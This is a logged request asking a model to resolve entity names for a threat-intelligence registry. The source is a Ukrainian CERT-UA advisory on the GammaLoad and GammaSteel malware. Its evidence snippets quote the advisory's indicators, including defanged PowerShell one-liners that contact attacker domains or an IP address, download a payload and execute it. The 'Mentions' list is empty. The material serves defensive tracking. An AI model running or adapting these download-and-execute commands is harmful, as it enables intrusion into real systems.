=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. stage1.ps1
E3. z.ps1
E4. GammaLoad.PS1_v2
E5. stage2.ps1
E6. TRYxaEbX [aka TRYxaEbX.ps1]
E7. Test-ProxyLogon.ps1
E8. OUTSTEEL
E9. Mimikatz
E10. GraphSteel
E11. IIS [aka IIS (Internet Information Services)]
E12. .NET Framework
E13. nginx
E14. Internet Explorer
E15. Ngrok
E16. MarsStealer
E17. FTPGetter
E18. JesterStealer
E19. Hashcat
E20. Mozilla
E21. needrestart
E22. Meterpreter
E23. Safari
E24. PowerShell [aka powershell.exe]
E25. 223329.exe
E26. POWERGAP
E27. wscript.exe
E28. 62ea.exe
E29. SPECTR.Shell
E30. cmd.exe
E31. 966449.exe
E32. MS PowerPoint
E33. GammaSteel.NET
E34. HarvesterX
E35. PowerShell (powershell.exe)
E36. GammaSteel.PS1
E37. kopratiso.ru
E38. acteran.ru
E39. bilitora.ru
E40. fishitor.ru
E41. apoxipodes.ru
E42. dodortar.ru
E43. tiloraso.ru
E44. a0322810.xsph.ru
E45. billyhot.ru
E46. erwini.ru
E47. candidar.ru
E48. tortunas.ru
E49. lnk-upload.dodortar.ru
E50. mulleti.ru
E51. dod-upload.dodortar.ru
E52. emterox.ru
E53. motocheck.in
E54. stormpredictor.host
E55. ryomy.ru
E56. meteolink.host
E57. successilin.top
E58. bul-opros.top
E59. baidencult.com
E60. xsph.ru
E61. iol.pt
E62. toknowall.com
E63. gopoppers.com
E64. circulas.ru
E65. podologaneri.it
E66. co-opros.top
E67. districoperav.icu
E68. potrakit.ru
E69. giraffe-tour.ru
E70. rivierafamily.com
E71. mx-out-14.default-host.net
E72. nitikora.ru
E73. tridiuma.ru
E74. parodadoca.ru
E75. yandex.ru
E76. varanasiclick.ru
E77. olei.ro
E78. www.msftncsi.com
E79. jevejosader.top
E80. enlamentedeunasesor.com
E81. milotrad.ru
E82. milotraf.ru
E83. s8.h.mchost.ru
E84. lingrevelat.com
E85. aspe.ro
E86. omyce.ru
E87. pastebin.com
E88. leonardis.ru
E89. jokotras.ru
E90. afi-opros.top
E91. nikotod.ru
E92. mitraseo.hol.es
E93. marmaris.com.ua
E94. nx0.ru
E95. ncscc.gov.ua
E96. tas-gos.top
E97. staystrongjewels.com
E98. wi-opros.top
E99. xcasinobonuses.net
E100. viewdns.net
E101. servebeer.com
E102. evil.server.com
E103. 3utilities.com
E104. gotdns.ch
E105. agreminj.com
E106. whoer.net
E107. airmauritiusticket.com
E108. cloudflare-dns.com
E109. plexbd.net
E110. bounceme.net
E111. ddns.net
E112. sytes.net
E113. brunoboys.net
E114. dcshost.net
E115. ns.ns2-dns.com
E116. d-upl.ddns.net
E117. ns2-dns.com
E118. gov-ua.info
E119. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E120. ns.ns3-dns.com
E121. dyndns.com
E122. freedynamicdns.org
E123. arentuk.com
E124. www.facebook.com
E125. winchconstruction.com
E126. www.michiganmastereltiempo.com
E127. www.symantec.com
E128. kohhd.com
E129. fluoxi.com
E130. atlantar.ru
E131. motoristo.ru
E132. moolin.ru
E133. bubenci.ru
E134. callsol.ru
E135. clipperso.ru
E136. cooperi.ru
E137. detroito.ru
E138. farafauler.ru
E139. flayga.ru
E140. ganara.ru
E141. hawksi.ru
E142. hofsteder.ru
E143. kilitro.ru
E144. kurapat.ru
E145. lnasfe.ru
E146. lopasts.ru
E147. mafirti.ru
E148. metanat.ru
E149. mitlubald.ru
E150. paparat.ru
E151. pasamart.ru
E152. qkcew.ru
E153. rncsq.ru
E154. tarlit.ru
E155. tbwelo.ru
E156. wicksl.ru
E157. xcqef.ru
E158. nxkad.ru
E159. dnslookup.seowebchecker.com
E160. tools.nexcess.net
E161. viewdns.info
E162. www.portcheckers.com
E163. lover.printing82.detroito.ru
Mentions:
